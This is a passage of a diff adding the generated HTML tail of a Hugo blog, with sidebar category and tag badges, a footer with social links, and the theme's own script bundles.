+          </a><a href="https://cornradio.github.io/hugo/categories/ssh/" class="badge bg-primary text-white rounded post-taxonomy" title="ssh">
+            ssh
+          </a></div>
+      </div>
+    </section><section class="taxonomies row card component">
+      <div class="card-body">
+        <h2 class="card-title">
+          <a href="https://cornradio.github.io/hugo/tags">标签</a>
+        </h2>
+        <div><a href="https://cornradio.github.io/hugo/tags/ubuntu/" class="badge bg-primary text-white rounded post-taxonomy" title="ubuntu">
+            ubuntu
+          </a><a href="https://cornradio.github.io/hugo/tags/python/" class="badge bg-primary text-white rounded post-taxonomy" title="python">
+            python
+          </a><a href="https://cornradio.github.io/hugo/tags/csharp/" class="badge bg-primary text-white rounded post-taxonomy" title="csharp">
+            csharp
+          </a><a href="https://cornradio.github.io/hugo/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" class="badge bg-primary text-white rounded post-taxonomy" title="命令行">
+            命令行
+          </a><a href="https://cornradio.github.io/hugo/tags/c#/" class="badge bg-primary text-white rounded post-taxonomy" title="c#">
+            c#
+          </a><a href="https://cornradio.github.io/hugo/tags/linux/" class="badge bg-primary text-white rounded post-taxonomy" title="linux">
+            linux
+          </a><a href="https://cornradio.github.io/hugo/tags/js/" class="badge bg-primary text-white rounded post-taxonomy" title="js">
+            js
+          </a><a href="https://cornradio.github.io/hugo/tags/mac/" class="badge bg-primary text-white rounded post-taxonomy" title="mac">
+            mac
+          </a><a href="https://cornradio.github.io/hugo/tags/winform/" class="badge bg-primary text-white rounded post-taxonomy" title="winform">
+            winform
+          </a><a href="https://cornradio.github.io/hugo/tags/clash/" class="badge bg-primary text-white rounded post-taxonomy" title="clash">
+            clash
+          </a></div>
+      </div>
+    </section>
+    
+  </div>
+</aside>
+</div>
+    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center"><a class="nav-link social-link" target="_blank" href="https://github.com/cornradio" title="GitHub" rel="noopener noreferrer">
+        <i class="fa-fw fa-2x fab fa-github"></i>
+      </a><a class="nav-link social-link" target="_blank" href="https://t.me/tsogview" title="Telegram" rel="noopener noreferrer">
+        <i class="fa-fw fa-2x fab fa-telegram-plane"></i>
+      </a></nav>
+<div class="copyright mb-2">
+  Free To Share.
+</div>
+<div class="powered-by mb-2">
+  Powered by <a href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">Bootstrap</a> theme.
+</div></footer>
+<script src="https://cornradio.github.io/hugo/js/bundle.min.d09a155a67acde7c98ded699a2ecd7f0ed89b5198cbfc833557a969155fdff8f.js" integrity="sha256-0JoVWmes3nyY3taZouzX8O2JtRmMv8gzVXqWkVX9/48=" crossorigin="anonymous" defer></script><script defer src="https://cornradio.github.io/hugo/js/viewer.min.c7d80bcbb67ca1cf05edc7a16b9f91fcbca3bcbc16e52f0117b583439e5e1102.js" integrity="sha256-x9gLy7Z8oc8F7ceha5&#43;R/LyjvLwW5S8BF7WDQ55eEQI=" crossorigin="anonymous"></script>
+</body>
+</html>
